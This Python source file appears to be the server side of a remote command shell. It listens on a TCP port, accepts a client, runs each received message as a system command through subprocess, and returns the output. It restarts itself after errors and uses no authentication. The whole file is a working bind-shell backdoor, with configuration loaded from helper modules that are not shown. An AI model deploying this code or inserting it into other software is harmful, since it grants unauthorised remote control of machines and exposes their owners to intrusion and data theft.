import socket as SocketLib
import os
import subprocess
import Functions
import Settings


OutputSplitter = Settings.OutputSplitter
DefaultShell = Settings.VoidString
ShellCommandSplitter = Settings.NDefaultShellCommandSplitter



def Start():
    global DefaultShell, ShellCommandSplitter

    Message = Settings.VoidString
    ServerSocket = Functions.CreateSocket(SocketLib.AF_INET, SocketLib.SOCK_STREAM)

    if Functions.Bind(ServerSocket, Settings.AcceptingIp, Settings.ServerPort) == -1:
        print(Settings.BindErrorMessage)
        return Settings.ErrorCode
    


    ServerSocket.listen(Settings.ServerQueue)

    ClientSocket, ClientInfo = ServerSocket.accept()

    Functions.CheckAndPrint(Settings.DebugOutputFlag, ClientInfo) 

    Functions.CheckAndPrint(Settings.DebugOutputFlag, Settings.AcceptMessage) 


    while Message != Settings.ServerEndCommand:
        CommandOutput = Settings.VoidString
        Message = Settings.VoidString
        print(Settings.OutputSplitter)

        try:
            Functions.CheckAndPrint(Settings.DebugOutputFlag, Settings.CommandWaitingMessage)
            Message = Functions.RecvAndDecode(ClientSocket, Settings.Frame)
            #Message = ClientSocket.recv(Frame).decode()
            print(Message)

            if Message == Settings.VoidString:
                print(Settings.RefusedConnectionMessage)
                return Settings.ErrorCode
        except:
            print(Settings.RecvErrorMessage)
            return Settings.ErrorCode

        if Message == Settings.SetDefaultShellCommand:
            Functions.SendAndEncode(ClientSocket, Settings.SetDefaultShellCommandMessage)
            DefaultShell = Functions.RecvAndDecode(ClientSocket, Settings.Frame) 

            if DefaultShell == Settings.RemoveDefaultShell:
                DefaultShell = Settings.VoidString
                Functions.CheckAndPrint(Settings.DebugOutputFlag, Settings.RemovedDefaultShellMessage)
                ShellCommandSplitter = Settings.NDefaultShellCommandSplitter
                Functions.SendAndEncode(ClientSocket, Settings.RemovedDefaultShellMessage)

            else:
                ShellCommandSplitter = Settings.YDefaultShellCommandSplitter # " "
                Functions.SendAndEncode(ClientSocket, Settings.DefaultShellMessage + Settings.SpaceSplitChar + DefaultShell)

        else:
            Command = DefaultShell + ShellCommandSplitter + Message

            try:
                print(Command)
                CommandOutput = str(subprocess.run(Command, stdout=subprocess.PIPE))
                print(CommandOutput)

            except:
                Functions.SendAndEncode(ClientSocket, Settings.ShellErrorMessage)

            Functions.SendAndEncode(ClientSocket, CommandOutput)
            print(Settings.OutputSplitter)



    ServerSocket.close()
    ClientSocket.close()

    return Settings.SuccessfulCode


if __name__ == "__main__":
    rc = 1
    while rc != 0:
        print('Restart...')
        rc = Start()

    print(Settings.EndOfProgram)
